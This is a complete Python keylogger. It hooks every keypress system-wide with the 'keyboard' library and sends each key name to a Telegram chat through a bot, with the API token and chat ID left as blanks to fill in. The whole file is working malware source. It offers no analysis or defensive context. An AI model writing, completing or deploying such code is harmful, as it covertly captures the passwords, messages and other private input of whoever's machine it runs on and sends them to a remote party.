import telebot
import keyboard

API_TOKEN = ''
CHAT_ID = 0000000000
bot = telebot.TeleBot(API_TOKEN)

def on_press(key):
    bot.send_message(CHAT_ID, f"{key.name}")

keyboard.on_press(on_press)
    
bot.infinity_polling(timeout=30,long_polling_timeout=10)
keyboard.wait() 
